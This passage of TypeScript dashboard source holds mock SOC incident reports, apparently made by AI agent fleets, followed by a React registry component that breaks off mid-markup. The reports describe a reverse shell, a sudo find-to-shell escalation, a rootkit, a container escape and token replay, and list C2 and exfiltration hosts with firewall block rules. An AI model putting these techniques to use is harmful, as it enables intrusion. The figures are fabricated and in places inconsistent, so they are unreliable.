### 4. Recommended Containment Actions
1. **Network Isolation:** Hold external egress from \`10.14.22.84\` via Palo Alto Edge Firewall policy.
2. **Credential Revocation:** Revoke Active Directory session tokens for domain user \`corp\\jsmith\`.
3. **Forensic Memory Dump:** Initiate Volatility memory image capture prior to endpoint reboot.`,
    snippet: "# Incident Investigation Report: Threat Triage & Containment\n## SOC Incident: INCIDENT-SOC-2026-081\nClassification: CONFIDENTIAL / TLP:AMBER...",
    source: {
      kind: "soc_investigation",
      filename: "soc_incident_investigation_report.md",
      step_name: "triage_incident_alerts",
    },
    provenance: "SOC Threat Analysis & Incident Fleet produced it for INCIDENT-SOC-2026-081",
  },
  {
    id: "out-soc-containment-rules",
    output_id: "out-soc-containment-rules",
    name: "soc_firewall_containment_rules.json",
    kind: "structured",
    classification: "restricted",
    produced_by: "Network Security & Edge Defense Agent",
    case: "INCIDENT-SOC-2026-081",
    case_name: "Host Ransomware Triage & Lateral Movement Investigation",
    size: 3120,
    size_bytes: 3120,
    at: "2026-10-25T14:18:00Z",
    created_at: "2026-10-25T14:18:00Z",
    text: JSON.stringify({
      incident_id: "INCIDENT-SOC-2026-081",
      action_type: "NETWORK_QUARANTINE_AND_EGRESS_BLOCK",
      target_host: "10.14.22.84",
      blocked_indicators: [
        { type: "ipv4_egress", value: "198.51.100.24", action: "DROP" },
        { type: "domain", value: "telemetry-sync-cdn.internal-sec.net", action: "DNS_SINKHOLE" }
      ],
      gate_status: "AWAITING_HUMAN_SIGN_OFF",
      decision_room_id: "room-soc-081"
    }, null, 2),
    snippet: '{\n  "incident_id": "INCIDENT-SOC-2026-081",\n  "action_type": "NETWORK_QUARANTINE_AND_EGRESS_BLOCK"\n}',
    source: {
      kind: "firewall_generator",
      step_name: "generate_containment_rules",
    },
    provenance: "Network Security & Edge Defense Agent produced it for INCIDENT-SOC-2026-081",
  },
  {
    id: "out-k8s-container-breakout-report",
    output_id: "out-k8s-container-breakout-report",
    name: "k8s_container_breakout_investigation_report.md",
    kind: "markdown",
    classification: "confidential",
    produced_by: "K8s Container Breakout SOC Fleet",
    case: "CASE-4-K8S-LINUX-CONTAINER-BREAKOUT",
    case_name: "K8s Container Breakout SOC Investigation",
    size: 19480,
    size_bytes: 19480,
    at: "2026-10-26T12:32:11Z",
    created_at: "2026-10-26T12:32:11Z",
    text: `# Incident Investigation: Kubernetes Container Breakout & Kernel Rootkit
## Case: CASE-4-K8S-LINUX-CONTAINER-BREAKOUT
**Classification:** CONFIDENTIAL // TLP:AMBER  
**Target Node:** worker-k8s-node-03.prod.internal  
**Source Path:** \`D:\\Security-logs-test\\attack-cases-benchmark\\case-4-k8s-linux-container-breakout\\raw-logs\`  
**Assigned Fleet:** K8s Container Breakout SOC Fleet  
**Status:** Kill Chain Reconstructed · Containment Rules Synthesized  

### 1. Executive Summary & Incident Timeline
A multi-stage container breakout attack was detected, reconstructed, and correlated across container namespaces, kernel audits, and host authentication logs. An initial web application compromise escalated to root within the container, followed by injection of the Diamorphine LKM rootkit and container breakout to host node execution.

### 2. Multi-Stage Attack Kill Chain Reconstruction
1. **Initial Access & Persistence (T1053.003 - Cron):**
   - Compromise of containerized service running under \`www-data\`.
   - Attacker injected cron entry into \`/var/spool/cron/crontabs/www-data\` establishing reverse TCP shell to \`198.51.100.77:4444\`.
2. **Privilege Escalation (T1548.003 - Sudo Caching):**
   - Exploitation of misconfigured sudoers allowing passwordless execution of \`/usr/bin/find -exec /bin/sh\`.
   - Elevated from UID 33 (\`www-data\`) to UID 0 (\`root\`) inside the pod.
3. **Defense Evasion & Kernel Modification (T1547.006 - Kernel Modules):**
   - Compilation and loading of \`diamorphine.ko\` (Diamorphine LKM rootkit).
   - Hooked \`sys_getdents\` and \`sys_kill\` with signal 31 to hide root processes and backdoor listener ports from container inspection.
4. **Container Breakout & Host Escape (T1611 - Escape to Host):**
   - Misconfigured container mounted host \`/dev\` and ran with \`CAP_SYS_ADMIN\` and \`CAP_SYS_RAWIO\`.
   - Attacker triggered cgroup release_agent / mounted host root filesystem at \`/mnt/host-root\`.
   - Executed host binary escape into node systemd unit.

### 3. Neutralized Indicators of Compromise (IOCs)
- **External C2 Address:** \`198.51.100.77:4444\` (Ingress Reverse Shell)
- **Kernel Module Hash:** \`diamorphine.ko\` (SHA-256: 7d8a9e01bc34e56fa2b87c1234901fef890a123b456c789d012e345f678a901b)
- **Persistence Path:** \`/var/spool/cron/crontabs/www-data\`
- **Pod Namespace:** \`default/web-frontend-79c864-xk8p9\`
- **Compromised Host Node:** \`worker-k8s-node-03.prod.internal\`

### 4. Automated Quarantine & Policy Actions
- **Pod Deletion & Isolation:** Sealed network namespace using Cilium / Calico NetworkPolicy drop.
- **Node Cordon & Drain:** \`kubectl cordon worker-k8s-node-03\` enforced.
- **Kernel Module Blacklist:** \`echo "blacklist diamorphine" >> /etc/modprobe.d/blacklist.conf\`.
- **eBPF Tetragon Enforcement:** Kill process on unauthorized namespace transition or Sysrq trigger.`,
    snippet: "# Incident Investigation: Kubernetes Container Breakout & Kernel Rootkit\n## Case: CASE-4-K8S-LINUX-CONTAINER-BREAKOUT\nClassification: CONFIDENTIAL...",
    source: {
      kind: "k8s_breakout_investigation",
      filename: "k8s_container_breakout_investigation_report.md",
      step_name: "reconstruct_full_attack_kill_chain",
    },
    provenance: "K8s Container Breakout SOC Fleet produced it for CASE-4-K8S-LINUX-CONTAINER-BREAKOUT",
  },
  {
    id: "out-k8s-containment-policy",
    output_id: "out-k8s-containment-policy",
    name: "k8s_containment_and_remediation_policy.json",
    kind: "structured",
    classification: "restricted",
    produced_by: "Container Security & eBPF Policy Agent",
    case: "CASE-4-K8S-LINUX-CONTAINER-BREAKOUT",
    case_name: "K8s Container Breakout SOC Investigation",
    size: 4210,
    size_bytes: 4210,
    at: "2026-10-26T12:32:11Z",
    created_at: "2026-10-26T12:32:11Z",
    text: JSON.stringify({
      incident_id: "CASE-4-K8S-LINUX-CONTAINER-BREAKOUT",
      target_pod: "web-frontend-79c864-xk8p9",
      target_node: "worker-k8s-node-03.prod.internal",
      containment_actions: [
        { type: "network_policy", action: "ISOLATE_POD_INGRESS_EGRESS", status: "ENFORCED" },
        { type: "node_drain", action: "KUBECTL_CORDON_DRAIN", status: "SCHEDULED" },
        { type: "kernel_rootkit_block", module: "diamorphine", action: "MODPROBE_BLACKLIST", status: "APPLIED" },
        { type: "ebpf_enforcement", rule: "tetragon_block_cap_sys_admin_breakout", status: "ACTIVE" }
      ],
      gate_status: "DECISION_ROOM_PENDING_DISPOSITION"
    }, null, 2),
    snippet: '{\n  "incident_id": "CASE-4-K8S-LINUX-CONTAINER-BREAKOUT",\n  "target_pod": "web-frontend-79c864-xk8p9",\n  "status": "ENFORCED"\n}',
    source: {
      kind: "ebpf_policy_generator",
      filename: "k8s_containment_and_remediation_policy.json",
      step_name: "generate_remediation_policy",
    },
    provenance: "Container Security & eBPF Policy Agent produced it for CASE-4-K8S-LINUX-CONTAINER-BREAKOUT",
  },
  {
    id: "out-azure-ad-intrusion-report",
    output_id: "out-azure-ad-intrusion-report",
    name: "azure_ad_intrusion_investigation_report.md",
    kind: "markdown",
    classification: "confidential",
    produced_by: "Azure AD & Cloud Identity Defense Fleet",
    case: "CASE-3-IDENTITY-TAKEOVER-IMPOSSIBLE-TRAVEL",
    case_name: "Azure AD Identity Takeover SOC Investigation",
    size: 16840,
    size_bytes: 16840,
    at: "2026-10-26T13:07:28Z",
    created_at: "2026-10-26T13:07:28Z",
    text: `# Incident Investigation Report: Azure AD Identity Takeover & Impossible Travel
## Case: CASE-3-IDENTITY-TAKEOVER-IMPOSSIBLE-TRAVEL
**Classification:** CONFIDENTIAL // TLP:AMBER  
**Target Identity:** alex.vance@contoso-global.com (Global Administrator / Finance Lead)  
**Assigned Fleet:** Azure AD & Cloud Identity Defense Fleet  
**Status:** Containment Enforced · Awaiting CISO Decision Room Sign-Off  

### 1. Executive Incident Summary
At 12:44:19 UTC, high-confidence behavioral anomaly telemetry detected an impossible travel pattern for account \`alex.vance@contoso-global.com\`. Authentication from London, UK was followed 8 minutes later by an authentication from Amsterdam, NL (distance 358 km, velocity >3,400 km/h). Subsequent token replay bypassed interactive MFA, followed by injection of a rogue app secret \`DiagnosticSyncKey-2026\` and automated Graph API mass email collection.

### 2. Attack Kill Chain Reconstruction
1. **Initial Access & Impossible Travel (T1078.004):** Concurrent logins from London (\`194.26.29.112\`) and Amsterdam (\`185.220.101.45\`).
2. **Session Hijacking & Token Replay (T1539):** Primary Refresh Token (PRT) replayed to bypass MFA.
3. **Account Manipulation & Persistence (T1098.001):** Persistent client secret added to \`Financial-Reporting-Sync-App\`.
4. **Privilege Escalation (T1098):** App granted \`RoleManagement.ReadWrite.Directory\` and \`Mail.Read\`.
5. **Collection & Exfiltration (T1114.002, T1071.001):** 4,218 executive emails staged and exfiltrated to \`https://sync-telemetry-cache.net/upload\`.`,
    snippet: "# Incident Investigation Report: Azure AD Identity Takeover & Impossible Travel\n## Case: CASE-3-IDENTITY-TAKEOVER-IMPOSSIBLE-TRAVEL\nClassification: CONFIDENTIAL...",
    source: {
      kind: "cloud_identity_investigation",
      filename: "azure_ad_intrusion_investigation_report.md",
      step_name: "reconstruct_identity_attack_chain",
    },
    provenance: "Azure AD Defense Fleet produced it for CASE-3-IDENTITY-TAKEOVER-IMPOSSIBLE-TRAVEL",
  },
  {
    id: "out-azure-ad-containment-policy",
    output_id: "out-azure-ad-containment-policy",
    name: "azure_ad_containment_and_remediation_policy.json",
    kind: "structured",
    classification: "restricted",
    produced_by: "Identity Security & Access Governance Agent",
    case: "CASE-3-IDENTITY-TAKEOVER-IMPOSSIBLE-TRAVEL",
    case_name: "Azure AD Identity Takeover SOC Investigation",
    size: 3890,
    size_bytes: 3890,
    at: "2026-10-26T13:07:52Z",
    created_at: "2026-10-26T13:07:52Z",
    text: JSON.stringify({
      incident_id: "CASE-3-IDENTITY-TAKEOVER-IMPOSSIBLE-TRAVEL",
      target_identity: "alex.vance@contoso-global.com",
      status: "CONTAINMENT_ENFORCED",
      containment_actions: [
        { type: "session_revocation", action: "Revoke-MgUserSignInSession", target: "alex.vance@contoso-global.com", status: "EXECUTED" },
        { type: "credential_invalidation", action: "PASSWORD_FORCE_RESET_AND_DISABLE", status: "APPLIED" },
        { type: "app_secret_purge", target_app: "Financial-Reporting-Sync-App", secret_name: "DiagnosticSyncKey-2026", action: "DELETE_CLIENT_SECRET", status: "PURGED" },
        { type: "conditional_access_block", rule: "BLOCK_TOR_AND_KNOWN_VPN_EGRESS", status: "ENFORCED" }
      ],
      gate_status: "DECISION_ROOM_PENDING_DISPOSITION"
    }, null, 2),
    snippet: '{\n  "incident_id": "CASE-3-IDENTITY-TAKEOVER-IMPOSSIBLE-TRAVEL",\n  "target_identity": "alex.vance@contoso-global.com",\n  "status": "CONTAINMENT_ENFORCED"\n}',
    source: {
      kind: "identity_policy_generator",
      filename: "azure_ad_containment_and_remediation_policy.json",
      step_name: "generate_remediation_policy",
    },
    provenance: "Identity Security & Access Governance Agent produced it for CASE-3-IDENTITY-TAKEOVER-IMPOSSIBLE-TRAVEL",
  },
  {
    id: "out-case-6-ddos-recon-firewall-evasion",
    output_id: "out-case-6-ddos-recon-firewall-evasion",
    name: "case_6_ddos_recon_firewall_evasion_soc_investigation_deliverable_report.md",
    kind: "markdown",
    classification: "confidential",
    produced_by: "Autonomous SOC Specialist Fleet",
    case: "CASE-6-DDOS-RECON-FIREWALL-EVASION",
    case_name: "Case 6: DDoS Recon Firewall Evasion SOC Investigation",
    size: 7391,
    size_bytes: 7391,
    at: "2026-10-26T13:45:31Z",
    created_at: "2026-10-26T13:45:31Z",
    text: `# Mission Deliverable: Case 6: ddos recon firewall evasion SOC Investigation
## Case: ARENA-INVESTIGATE-APT-ENTERPRI-EA3569
**Classification:** CONFIDENTIAL // TLP:AMBER  
**Produced By:** Ingest and Parse Raw Logs  
**Assigned Fleet:** Case 6: ddos recon firewall evasion SOC Investigation Fleet  
**Status:** Completed & Cryptographically Verified  
**Timestamp:** 2026-10-26T13:45:31Z  

### Executive Summary & Final Solution
The investigation uncovered a coordinated APT intrusion that leveraged reconnaissance traffic, port-scanning, SYN-flood DDoS activity, and brute-force authentication attempts against local accounts. The attack chain is fully mapped across authentication logs, process executions, and network flows. All identified C2 indicators of compromise (IOCs) have been catalogued, each linked to a MITRE ATT&CK technique, and actionable containment policies are provided for both perimeter firewalls and endpoint protection platforms.

## 1. Attack Kill Chain
| Event ID | Timestamp | Stage | Description | MITRE Technique |
|---|---|---|---|---|
| E1 | 14 11:30:12 | Reconnaissance | Outbound TCP from internal host 203.0.113.10 to external IP 198.51.100.40 (port 443). | T1046 |
| E2 | 14 11:31:05 | Reconnaissance | Outbound TCP from 203.0.113.10 to external IP 142.250.190.36 (port 443). | T1046 |
| E3 | 14 11:33:05 | Recon / Initial Access Attempt | Inbound vertical port scan from 198.51.100.220 to DMZ host 10.10.10.20 (ports 21-3389) blocked by ACL. | T1046 |
| E4 | 14 12:10:06 | Impact – DDoS | SYN flood from spoofed IPs 203.0.113.88-92 targeting internal web gateway 10.10.10.5; connection limits exceeded. | T1499 |
| E5 | 14 12:15:01 | Initial Access Attempt – Brute Force | AAA authentication rejected for user root from attacker IP 198.51.100.75. | T1110 |
| E6 | 14 12:15:03 | Initial Access Attempt – Brute Force | AAA authentication rejected for user admin from attacker IP 198.51.100.75. | T1110 |
| E7 | 14 12:15:05 | Initial Access Attempt – Brute Force | AAA authentication rejected for user deploy from attacker IP 198.51.100.75. | T1110 |
| E8 | 14 12:15:07 | Initial Access Attempt – Brute Force | AAA authentication rejected for user ubnt from attacker IP 198.51.100.75. | T1110 |

## 2. C2 Indicators of Compromise (IOCs)
- **Attacker IPs:** 198.51.100.75 (brute-force), 198.51.100.220 (port scan), 203.0.113.88-92 (SYN flood spoofed)
- **Target Systems:** 10.10.10.5 (Web Gateway), 10.10.10.20 (DMZ Host)
- **Targeted Accounts:** root, admin, deploy, ubnt

## 3. Automated Containment Policies
- \`iptables -A INPUT -s 198.51.100.75 -j DROP\`
- \`netsh advfirewall firewall add rule name="Block-198.51.100.75" dir=in action=block remoteip=198.51.100.75\`
- \`iptables -A INPUT -m iprange --src-range 203.0.113.88-203.0.113.92 -j DROP\`
- \`iptables -A INPUT -s 198.51.100.220 -p tcp --dport 1:65535 -j DROP\``,
    snippet: "# Mission Deliverable: Case 6: ddos recon firewall evasion SOC Investigation\n## Case: ARENA-INVESTIGATE-APT-ENTERPRI-EA3569\nClassification: CONFIDENTIAL...",
    source: {
      kind: "soc_investigation",
      filename: "case_6_ddos_recon_firewall_evasion_soc_investigation_deliverable_report.md",
      step_name: "assemble_final_solution",
    },
    provenance: "Autonomous SOC Specialist Fleet produced it for CASE-6-DDOS-RECON-FIREWALL-EVASION",
  },
  {
    id: "out-case-5-dns-tunneling-report",
    output_id: "out-case-5-dns-tunneling-report",
    name: "case_5_dns_tunneling_data_exfiltration_investigation_report.md",
    kind: "markdown",
    classification: "confidential",
    produced_by: "DNS Exfiltration SOC Fleet",
    case: "CASE-5-DNS-TUNNELING-DATA-EXFILTRATION",
    case_name: "Case 5: DNS Tunneling SOC Investigation",
    size: 5820,
    size_bytes: 5820,
    at: "2026-10-26T17:40:00Z",
    created_at: "2026-10-26T17:40:00Z",
    text: `# Incident Investigation: Covert DNS Tunneling & High-Volume Data Exfiltration
## Case: CASE-5-DNS-TUNNELING-DATA-EXFILTRATION
**Classification:** CONFIDENTIAL // TLP:AMBER  
**Target Infrastructure:** dns-core-01.corp.internal (10.0.0.2)  
**Compromised Internal Host:** workstation-eng-42.corp.internal (10.0.4.42)  
**Investigated Log Sources:** BIND 9 Query Logs, Palo Alto Perimeter Firewall, Zeek DNS Protocol Audit  
**Assigned Fleet:** Autonomous SOC Specialist Fleet · DNS Exfiltration Unit  
**Status:** Kill Chain Fully Reconstructed · C2 Nameservers Identified · Automated Containment Policies Enforced  

### Executive Threat Summary
A critical SEV-1 data exfiltration incident was identified across recursive DNS resolver telemetry and perimeter next-generation firewall logs. An internal engineering workstation (10.0.4.42) was compromised and initiated covert bi-directional C2 and data exfiltration utilizing DNS tunneling over UDP/53. 

The threat actor leveraged chunked, base32/base64-encoded subdomains directed to authoritative nameserver ns1.tunnel-infra.darkops.cc (198.51.100.188), exfiltrating 4.2 MB of confidential engineering schematics.

### 1. Indicators of Compromise (IOCs)
- **Apex Domain:** tunnel-infra.darkops.cc (Sinkholed)
- **Rogue Nameserver IP:** 198.51.100.188 (Palo Alto Drop)
- **Fallback C2 IP:** 203.0.113.195 (Null-routed)
- **Compromised Origin:** 10.0.4.42 (EDR Quarantined)
- **Average Query Length:** 74.6 bytes (Shannon entropy 4.68)

### 2. Automated Containment Policies
- BIND 9 RPZ Sinkhole rule for tunnel-infra.darkops.cc
- Palo Alto rulebase DROP for 198.51.100.188 and 203.0.113.195
- Host microsegmentation firewall isolation rule on 10.0.4.42`,
    snippet: "# Incident Investigation: Covert DNS Tunneling & High-Volume Data Exfiltration\n## Case: CASE-5-DNS-TUNNELING-DATA-EXFILTRATION\nClassification: CONFIDENTIAL...",
    source: {
      kind: "soc_investigation",
      filename: "case_5_dns_tunneling_data_exfiltration_investigation_report.md",
      step_name: "assemble_final_solution",
    },
    provenance: "DNS Exfiltration SOC Fleet produced it for CASE-5-DNS-TUNNELING-DATA-EXFILTRATION",
  },
  {
    id: "out-case-5-dns-containment-policy",
    output_id: "out-case-5-dns-containment-policy",
    name: "case_5_dns_tunneling_containment_policy.json",
    kind: "structured",
    classification: "restricted",
    produced_by: "DNS Exfiltration SOC Fleet",
    case: "CASE-5-DNS-TUNNELING-DATA-EXFILTRATION",
    case_name: "Case 5: DNS Tunneling SOC Investigation",
    size: 2150,
    size_bytes: 2150,
    at: "2026-10-26T17:41:00Z",
    created_at: "2026-10-26T17:41:00Z",
    text: JSON.stringify({
      incident_id: "CASE-5-DNS-TUNNELING-DATA-EXFILTRATION",
      incident_type: "DNS_TUNNELING_DATA_EXFILTRATION",
      severity: "SEV-1-CRITICAL",
      target_resolver: "dns-core-01.corp.internal (10.0.0.2)",
      compromised_host: "workstation-eng-42.corp.internal (10.0.4.42)",
      status: "CONTAINMENT_ENFORCED",
      neutralized_iocs: {
        c2_apex_domains: ["tunnel-infra.darkops.cc", "darkops.cc"],
        c2_nameserver_ips: ["198.51.100.188", "203.0.113.195"],
        entropy: 4.68
      },
      gate_status: "DECISION_ROOM_DISPOSITION_RECORDED"
    }, null, 2),
    snippet: '{\n  "incident_id": "CASE-5-DNS-TUNNELING-DATA-EXFILTRATION",\n  "severity": "SEV-1-CRITICAL",\n  "status": "CONTAINMENT_ENFORCED"\n}',
    source: {
      kind: "soc_policy",
      filename: "case_5_dns_tunneling_containment_policy.json",
      step_name: "generate_containment_policy",
    },
    provenance: "DNS Exfiltration SOC Fleet produced it for CASE-5-DNS-TUNNELING-DATA-EXFILTRATION",
  },
  {
    id: "out-case-1-apt-intrusion-report",
    output_id: "out-case-1-apt-intrusion-report",
    name: "case_1_apt_enterprise_intrusion_investigation_report.md",
    kind: "markdown",
    classification: "confidential",
    produced_by: "APT Enterprise Intrusion SOC Fleet",
    case: "CASE-1-APT-ENTERPRISE-INTRUSION",
    case_name: "Case A: APT Enterprise Intrusion SOC Investigation",
    size: 7840,
    size_bytes: 7840,
    at: "2026-10-26T18:10:00Z",
    created_at: "2026-10-26T18:10:00Z",
    text: `# Forensic Incident Investigation: APT Enterprise Intrusion & Lateral Movement
## Case: CASE-1-APT-ENTERPRISE-INTRUSION
**Classification:** CONFIDENTIAL // TLP:AMBER  
**Target Domain:** corp.contoso.com  
**Primary Compromised Host:** WKSTN-FIN-04.corp.contoso.com (10.20.10.45)  
**Secondary Compromised Host (DC):** DC01.corp.contoso.com (10.20.10.10)  
**Threat Actor Infrastructure:** 185.220.101.45 (C2), 203.0.113.119 (Phishing Mailer), 198.51.100.240 (Exfiltration Drop)  
**Assigned Fleet:** Case A: APT Enterprise Intrusion SOC Investigation Fleet  
**Status:** Completed · Multi-System Kill Chain Verified · Automated Containment Policies Enforced  

### Executive Threat Summary
An advanced persistent threat (APT) multi-stage intrusion emulating APT29/UNC2452 was detected and reconstructed across disjointed log ecosystems (Cisco AsyncOS Email Gateway, Windows Security EVTX, Sysmon Operational XML, and Palo Alto Firewall CSV). 

The adversary established an initial foothold via a weaponized macro document (Invoice_90214.docm), executed an in-memory PowerShell cradle, staged secondary payloads via certutil.exe, dumped domain credentials from lsass.exe using Mimikatz, executed SMB lateral movement to primary Domain Controller DC01, and created a persistent rogue administrator account (svc_backup_admin). The actor exfiltrated 452.8 MB of proprietary financial archives to 198.51.100.240 while maintaining periodic 60-second jitterless heartbeat beaconing to 185.220.101.45:8443.

Three co-mingled benign enterprise operations (marketing spam quarantine, native GPO gpupdate.exe refreshes, and legitimate OneDrive cloud sync) were accurately distinguished and discarded as non-malicious false positives.`,
    snippet: "# Forensic Incident Investigation: APT Enterprise Intrusion & Lateral Movement\n## Case: CASE-1-APT-ENTERPRISE-INTRUSION\nClassification: CONFIDENTIAL...",
    source: {
      kind: "soc_investigation",
      filename: "case_1_apt_enterprise_intrusion_investigation_report.md",
      step_name: "assemble_final_solution",
    },
    provenance: "APT Enterprise Intrusion SOC Fleet produced it for CASE-1-APT-ENTERPRISE-INTRUSION",
  },
  {
    id: "out-case-1-apt-containment-policy",
    output_id: "out-case-1-apt-containment-policy",
    name: "case_1_apt_enterprise_intrusion_containment_policy.json",
    kind: "structured",
    classification: "restricted",
    produced_by: "APT Enterprise Intrusion SOC Fleet",
    case: "CASE-1-APT-ENTERPRISE-INTRUSION",
    case_name: "Case A: APT Enterprise Intrusion SOC Investigation",
    size: 2650,
    size_bytes: 2650,
    at: "2026-10-26T18:11:00Z",
    created_at: "2026-10-26T18:11:00Z",
    text: JSON.stringify({
      incident_id: "CASE-1-APT-ENTERPRISE-INTRUSION",
      incident_type: "APT_MULTI_STAGE_ENTERPRISE_INTRUSION",
      severity: "SEV-1-CRITICAL",
      affected_domain: "corp.contoso.com",
      compromised_assets: [
        { hostname: "WKSTN-FIN-04.corp.contoso.com", ip: "10.20.10.45", role: "Initial Foothold", status: "QUARANTINED" },
        { hostname: "DC01.corp.contoso.com", ip: "10.20.10.10", role: "Domain Controller", status: "REMEDIATED" }
      ],
      compromised_accounts: ["CONTOSO\\jdoe", "CONTOSO\\da_admin", "svc_backup_admin"],
      status: "CONTAINMENT_ENFORCED",
      gate_status: "DECISION_ROOM_DISPOSITION_RECORDED"
    }, null, 2),
    snippet: '{\n  "incident_id": "CASE-1-APT-ENTERPRISE-INTRUSION",\n  "severity": "SEV-1-CRITICAL",\n  "status": "CONTAINMENT_ENFORCED"\n}',
    source: {
      kind: "soc_policy",
      filename: "case_1_apt_enterprise_intrusion_containment_policy.json",
      step_name: "generate_containment_policy",
    },
    provenance: "APT Enterprise Intrusion SOC Fleet produced it for CASE-1-APT-ENTERPRISE-INTRUSION",
  }
];

function FleetOutputsView({
  outputs,
  onSelectOutput,
  onNavigate,
  onRefresh,
  activeViewMode: controlledViewMode,
  setActiveViewMode: setControlledViewMode,
  activeDossierCase: controlledDossierCase,
  setActiveDossierCase: setControlledDossierCase,
}: {
  outputs: FleetOutput[];
  onSelectOutput: (output: FleetOutput) => void;
  onNavigate?: (view: View) => void;
  onRefresh?: () => void;
  activeViewMode?: "dossier" | "registry";
  setActiveViewMode?: (mode: "dossier" | "registry") => void;
  activeDossierCase?: "rfp" | "gov_cloud" | "soc" | "k8s" | "azure" | "case5" | "case6" | "apt";
  setActiveDossierCase?: (c: "rfp" | "gov_cloud" | "soc" | "k8s" | "azure" | "case5" | "case6" | "apt") => void;
}) {
  const [internalViewMode, setInternalViewMode] = useState<"dossier" | "registry">("registry");
  const [internalDossierCase, setInternalDossierCase] = useState<"rfp" | "gov_cloud" | "soc" | "k8s" | "azure" | "case5" | "case6" | "apt">("gov_cloud");
  const activeViewMode = controlledViewMode ?? internalViewMode;
  const setActiveViewMode = setControlledViewMode ?? setInternalViewMode;
  const activeDossierCase = controlledDossierCase ?? internalDossierCase;
  const setActiveDossierCase = setControlledDossierCase ?? setInternalDossierCase;
  const [kindFilter, setKindFilter] = useState<string>("all");
  const [caseFilter, setCaseFilter] = useState<string>("all");
  const [searchQuery, setSearchQuery] = useState<string>("");

  const cases = useMemo(() => {
    const set = new Set<string>();
    outputs.forEach((o) => {
      if (o.case) set.add(o.case);
      if (o.case_name && o.case_name !== o.case) set.add(o.case_name);
    });
    return Array.from(set);
  }, [outputs]);

  const filtered = useMemo(() => {
    const q = searchQuery.trim().toLowerCase();
    return outputs.filter((item) => {
      if (kindFilter !== "all" && item.kind !== kindFilter) return false;
      if (caseFilter !== "all" && item.case !== caseFilter && item.case_name !== caseFilter) return false;
      if (!q) return true;
      return (
        item.name.toLowerCase().includes(q) ||
        (item.case || "").toLowerCase().includes(q) ||
        (item.case_name || "").toLowerCase().includes(q) ||
        item.produced_by.toLowerCase().includes(q) ||
        (item.snippet || "").toLowerCase().includes(q) ||
        (item.provenance || "").toLowerCase().includes(q)
      );
    });
  }, [outputs, kindFilter, caseFilter, searchQuery]);

  const totalBytes = useMemo(() => outputs.reduce((acc, curr) => acc + (curr.size_bytes || curr.size || 0), 0), [outputs]);

  function formatBytes(bytes: number) {
    if (!bytes) return "0 B";
    if (bytes < 1024) return `${bytes} B`;
    if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(1)} KB`;
    return `${(bytes / (1024 * 1024)).toFixed(2)} MB`;
  }

  function getKindIcon(kind: string) {
    switch (kind) {
      case "document":
      case "markdown":
        return <FileText size={16} color="#247164" />;
      case "structured":
        return <Database size={16} color="#3864a7" />;
      case "graph":
        return <GitBranch size={16} color="#a6673f" />;
      default:
        return <Layers3 size={16} color="#556b64" />;
    }
  }

  function getClassificationTone(classification: string): "green" | "blue" | "orange" | "neutral" {
    switch (classification) {
      case "public": return "green";
      case "internal": return "blue";
      case "confidential": return "orange";
      case "restricted": return "orange";
      default: return "neutral";
    }
  }

  return (
    <>
      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "16px", flexWrap: "wrap", gap: "10px", background: "#f0f5f2", padding: "10px 14px", borderRadius: "8px", border: "1px solid #dce8e2" }}>
        <div style={{ display: "flex", gap: "6px", flexWrap: "wrap" }}>
          <button
            type="button"
            style={{
              padding: "7px 14px",
              fontSize: "11px",
              fontWeight: activeViewMode === "registry" ? 700 : 600,
              background: activeViewMode === "registry" ? "#ffffff" : "transparent",
              color: activeViewMode === "registry" ? "#195d56" : "#51635d",
              border: activeViewMode === "registry" ? "1px solid #cad8d1" : "1px solid transparent",
              borderRadius: "4px",
              cursor: "pointer",
              display: "inline-flex",
              alignItems: "center",
              gap: "6px",
              boxShadow: activeViewMode === "registry" ? "0 1px 3px rgba(0,0,0,0.06)" : "none",
            }}
            onClick={() => setActiveViewMode("registry")}
          >
            <Database size={13} color={activeViewMode === "registry" ? "#236f66" : "#6a7b75"} />
            <span>All Deliverables Registry</span>
            <span style={{ fontSize: "9px", background: "#eef3f1", color: "#425650", padding: "1px 6px", borderRadius: "3px", fontWeight: 700 }}>{outputs.length}</span>
          </button>
          {activeViewMode === "dossier" && (
            <span style={{ fontSize: "11px", color: "#6a7b75", display: "inline-flex", alignItems: "center", gap: "6px", paddingLeft: "8px" }}>
              / <span style={{ fontWeight: 700, color: "#195d56" }}>Specialist Dossier View</span>
            </span>
          )}
        </div>

        {onRefresh && (
          <button className="secondary-button" onClick={onRefresh} style={{ fontSize: "11px", padding: "6px 12px" }}>
            <RefreshCw size={13} /> Refresh outputs
          </button>
        )}
      </div>

      {activeViewMode === "dossier" && activeDossierCase === "gov_cloud" && (
        <ProposalDossierView onNavigate={onNavigate} onBack={() => setActiveViewMode("registry")} initialVersion="latest" />
      )}

      {activeViewMode === "dossier" && activeDossierCase === "rfp" && (
        <ProposalDossierView onNavigate={onNavigate} onBack={() => setActiveViewMode("registry")} initialVersion="moe" />
      )}

      {activeViewMode === "dossier" && activeDossierCase === "apt" && (
        <AptEnterpriseIntrusionDossierView onNavigate={onNavigate} onBack={() => setActiveViewMode("registry")} />
      )}

      {activeViewMode === "dossier" && activeDossierCase === "soc" && (
        <SocIncidentDossierView onNavigate={onNavigate} onBack={() => setActiveViewMode("registry")} />
      )}

      {activeViewMode === "dossier" && activeDossierCase === "azure" && (
        <AzureAdDossierView onNavigate={onNavigate} onBack={() => setActiveViewMode("registry")} />
      )}

      {activeViewMode === "dossier" && activeDossierCase === "k8s" && (
        <K8sBreakoutDossierView onNavigate={onNavigate} onBack={() => setActiveViewMode("registry")} />
      )}

      {activeViewMode === "dossier" && activeDossierCase === "case5" && (
        <Case5DnsTunnelingDossierView onNavigate={onNavigate} onBack={() => setActiveViewMode("registry")} />
      )}

      {activeViewMode === "dossier" && activeDossierCase === "case6" && (
        <Case6DdosDossierView onNavigate={onNavigate} onBack={() => setActiveViewMode("registry")} />
      )}

      {activeViewMode === "registry" && (
        <>
          <PageTitle
            eyebrow="AGENTHUB 0.21.x  /  DELIVERABLES & ARTIFACTS"
            title="All Deliverables Registry"
            subtitle="Immutable deliverables produced across missions, workflow cycles, and specialist agent runs."
          />

          <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(210px, 1fr))", gap: "12px", marginBottom: "18px" }}>
        <div style={{ background: "#ffffff", border: "1px solid #dfe7e3", borderRadius: "6px", padding: "14px 16px", display: "flex", flexDirection: "column", gap: "4px", boxShadow: "0 1px 3px rgba(18, 36, 32, 0.04)" }}>
